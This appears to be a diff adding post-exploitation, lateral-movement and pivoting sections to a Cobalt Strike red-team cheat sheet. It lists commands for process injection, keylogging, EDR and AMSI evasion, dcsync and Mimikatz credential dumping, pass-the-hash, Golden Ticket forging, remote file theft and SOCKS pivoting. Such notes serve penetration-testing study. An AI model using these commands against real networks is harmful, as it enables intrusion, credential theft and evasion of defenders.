@@ -447,6 +447,60 @@ If you're in the network, know lateral creds but do not have access to CS: Windo
 
 ## Post Exploitation ##
 
+### Beacon Management ###
+* Access - Manipulate identity and privileges
+* Explore - Control and gather data from the target
+* Pivoting - Tunnel through this Beacon
+* Session - Manage this access
+
+#### Session Passing ####
+* 'Beacon' > 'Spawn' or `spawn <arch> <listener>` - To spawn and inject
+* `spawnu <pid> <listener>` - To spawn with alternate parent and inject
+* `inject <pid> <arch> <listener>` - To inject into a specific process
+* `spawnto <arch> <path> <args>` - To change the program CS launches for temporary processes to try to avoid detection
+
+#### Execute ####
+* `execute-assembly <local path>/<file>.exe <args>` - To use a .NET assembly through a Beacon
+* `shell <command> <args>` - To run a command via cmd.exe
+* `powerpick <cmdlet> <args>` - To use PowerShell without powershell.exe
+* `psinject <pid> <arch> <cmdlet> <args>` - To run PowerShell within another process
+
+#### File Browser ####
+'Beacon' > 'Explore' > 'Browse Files'
+
+#### User Exploitation ####
+* `jobs`- To list jobs in a Beacon
+* `jobkill <ID>` - To stop a job
+* `screenshot <pid> <x86|x64> <time>` - Deploy screenshot tool. Results at: 'View' > 'Screenshots'
+* `keylogger <pid> <x86|x64>` - Deploy Keylogger. Results at: 'View' > 'Keystrokes'
+* `sleep 0` or `desktop <pid> <arch> <low|high>`- To watch or control a target's desktop
+
+### Tradecraft ###
+* Instrumentation and Telemetry
+   * Observable does not mean observed
+   * Evasion Strategies:
+      * Disable the instrumentation
+      * Spoof event properties to fool instrumentation
+      * Avoid OPSEC-expensive behaviors
+      * Adjust operations to blend in with legitimate activity or work within false positive exceptions
+      * Change offsense model
+
+* General Post-Exploitation Detections
+   * Behaviors (Event)
+      * Write a file to disk
+      * Execute a program
+      * Inject into new or existing processes
+   * Process Context (Event Property)
+      * explorer.exe, lsass.exe, notepad.exe, powershell.exe, rundll32.exe, svchost.exe
+      * Other commonly abused applications
+   * Post-exploitation tool - Memory Injected DLL (PiA)
+      * Behavior - Resolution of GetProcAddress and LoadLibrary -> Set 'post-ex' > 'smartinject' to True
+      * Thread Start Address - No module associated with the start address -> Controlled by 'process-inject' configuration
+      * Memory Permissions - RWX, RWX permissions. Odd 'AllocationProtect,Protect' pairs -> Controlled by 'process-inject' configuration
+      * Memory Content - Signs of a PE file, Strings associated with a toolset or common techniques -> Set 'post-ex' > 'obfuscate' to True
+   * PowerShell and .NET (Special Case)
+      * Functions, strings and patterns from offense tools -> Set 'post-ex' > 'amsi_disable' to True, use 'powerpick' or 'psinject' instead of 'powershell'
+
 - - - -
 
 ## Privilege Escalation ##
@@ -520,8 +574,150 @@ Mimikatz is a post-exploitation toolset for:
 
 ## Lateral Movement ##
 
+#### Lateral Movement in Windows Networks ####
+1. Reconnaissance: Targets and Users - Systems available for attack, admin users...
+2. Use 'Trust Material' to become 'Admin User' - Tokens, hashes, creds, kerberos tickets
+3. Attack - Steal files, run commands, execute payloads
+4. Recover more 'Trust Material' and repeat
+
+### Windows Enterprise ###
+* Local User - Account on the system (.\user or COMPUTER\user)
+* Domain User - User account on the domain controllers (DOMAIN\user)
+* Local Administrator - User with admin rights on a system
+* Domain Administrator - User with admin rights on the domain controller
+
+### Reconnaissance ###
+* Windows Commands - net, nltest...
+* Net Module - Beacon's built-in net commands
+* PowerView - ` powershell-import <path>/powerview.ps1 ` then ` powershell <command> <arguments> `
+* SharpView
+
+#### Which Domain am I on? ####
+* Windows - ` run net view /DOMAIN `
+* Net Module - ` net domain `
+* PowerView - ` powershell Get-NetDomain `
+
+#### Which Hosts are Domain Controllers? ####
+* Windows - ` run /dclist:[DOMAIN] `, ` run net group "Domain Controllers" /DOMAIN `
+* Net Module - ` net dclist [DOMAIN] `, ` net domain_controllers [DOMAIN] `
+* PowerView - ` powershell Get-NetDomainController `
+
+#### Which Hosts are in the Domain without Scanning? ####
+* Windows - ` run net view /DOMAIN:[DOMAIN] `, ` run net group "Domain Computers" /DOMAIN ` 
+* Net Module - ` net view [DOMAIN] `, ` net computers [DOMAIN.FQDN] `
+* PowerView - ` powershell Get-NetComputer `
+
+#### Turn NetBIOS Name to IP Address ####
+` shell nslookup <NetBIOS Name> `, ` shell ping -n 1 <NetBIOS Name> `
+
+#### How to Discover Domain Administrators ####
+* Beacon's `run` command
+   * `net group "enterprise admins" /DOMAIN`
+   * `net group "domain admins" /DOMAIN`
+   * `net localgroup "administrators" /DOMAIN`
+* Beacon's `net` module
+   * `net group \\DC Domain Admins`
+   * `net localgroup \\DC Administrators`
+
+#### Local Administrators ####
+It may be a Domain account or not!
+
+* 'net' module can query local groups and users
+   * `net localgroup \\TARGET`
+   * `net localgroup \\TARGET <group name>`
+* PowerView can find Local Administrators on a host
+   * `Get-NetLocalGroup -HostName TARGET`
+   * `Invoke-EnumerateLocalAdmin` - On every host
+
+### Agentless Post Exploitation - No Payload Needed ###
+* Use UNC path to reference files on another host
+* List files in C:\foo on remote host - `shell dir \\host\C$\foo`
+* Copy remote C:\foo\secrets.txt to current host - `shell copy \\host\C$\foo\secrets.txt`
+* Go shopping for files on a remote host - `shell dir /S /B \\host\C$ > files.txt`
+* WinRM (port 5985) can run commands to: `powershell Invoke-Command -ComputerName TARGET -ScriptBlock { Command }`
+* Use PowerSploit to run Mimikatz over WinRM: `powershell-import <path>/Invoke-Mimikatz.ps1` then `powershell Invoke-Mimikatz -ComputerName TARGET`
+* Use 'dcsync' to recover a password hash from a domain controller - `dcsync <domain> <DOMAIN\user>`
+* Use 'dcsync' to recover dump password hashes from a domain controller - `dcsync <domain>`
+
+### Trust Material ###
+* Tokens
+   * Use `ps` to list processes
+   * Use `steal_token <pid>` to steal a token
+   * Use `getuid` to find out who you are
+   * Use `rev2self` to drop the token
+* Credentials
+   * Use `spawnas DOMAIN\user <password>` - To spawn a Beacon with alternate creds
+   * Use `make_token DOMAIN\user <password>` - To create a token. Most commonly used command to create a token for a Beacon.
+* Password Hashes
+   * Pass-the-Hash
+      * Use Mimikatz - `pth DOMAIN\user <ntlmhash>` -> It starts a process with an access token populated with the username and the hash you provide. Then steals the token from that process. (Warning: This automation runs cmd.exe to pass a token back to the Beacon process, and it also interacts with LSASS)
+* Kerberos Tickets
+   * Use `run klist` to see which tickets are in your Kerberos tray
+   * Use `kerberos_ticket_purge` to purge tickets
+   * Use `kerberos_ticket_use <path>/<file>.ticket` to load a ticket
+   * 'Golden Ticket' - Self-generated Kerberos ticket with Domain Admin rights
+      * Forged with Mimikatz. It requires: the desired user and DOMAIN name, domain SID (`whoami /user` and drop last full number), and the NTLM hash of krbtgt user from DC.
+      * In CS: 'Beacon' > 'Access' > 'Golden Ticket'
+
+### Remote Code Execution ###
+* `jump` - Lateral movement automation
+* `remote-exec` - Bring your own weaponization
+
 - - - - 
 
 ## Pivoting ##
 
+### Port Scanning ###
+` portscan <hosts> <ports> <discover method: arp, icmp or none> <max nº of sockets open at once> `
 
+### Proxy Pivoting ###
+To go interactive: `sleep 0`.
+
+#### Pivoting through SOCKS ####
+* Tunnel traffic
+   * Set up a SOCKS4 proxy server tunneling through the current Beacon
+   * `socks <port>`
+   * Use `socks stop` to kill the SOCKS proxy server
+
+#### Tunneling Metasploit through Beacon ####
+* Force the Metasploit Framework to use your SOCKS proxy server for connections. From msfconsole:
+   * `setg Proxies socks4:127.0.0.1:<port>
+   * `setg ReverseAllowProxy true`
+* To stop pivoting - `unsetg Proxies`
+
+#### Pivoting with ProxyChains ####
+1. Start a SOCKS Proxy Server
+2. Edit '/etc/proxychains.conf' to point to the server
+3. Use `proxychains` to tunnel traffic
+
+#### Reverse Pivoting ####
+* Tunnel Traffic (Reverse)
+   * Make the target listen on a port and tunnel the connection to another system
+   * `rportfwd <listening port> <forward host> <forward port>`
+   * Use `rportfwd stop` to stop
+* Make sure to account for firewall on the target!
+
+### Pivot Listeners ###
+Way to turn a compromised system into a redirector that receives connections from the beacon payload. In CS: 'Beacon' > 'Pivoting' > 'Listener'.
+
+### SSH Sessions ###
+Can be used to upload, download, execute and pivot (and encrypted communication). They are useful because they're on the target already. 
+
+* Use `dropbear SSH` if a custom-configured agent is desired.
+* `ssh <target:port> <username> <password>` - To launch an SSH session with credentials
+* `ssh-key <target:port> <username> <path>/<key>` - To launch an SSH session with key authentication
+
+#### Post Exploitation in SSH Sessions ####
+* `shell <command> <args>` - Run a command
+* `sudo <password> <command> <args>` - Run a command with sudo
+* `upload <local file path>`
+* `download <file>`
+* `socks 1234` - Start SOCKS pivoting
+* `rportfwd <listening port> <forward host> <forward port>` - Reverse Port forward
+* `connect <host> <port>` - Connect to a TCP Beacon
+   * 'Session' > 'Pivoting' > 'Listener' - To create a Reverse TCP Beacon Pivot Listener
+
+### Browser Privoting ###
+Way to inherit a user's access to sites by relaying requests through their browser. Only available in IE.
+
+`browserpivot <pid> x86` or 'Beacon' > 'Pivoting' > 'Browser Pivot'
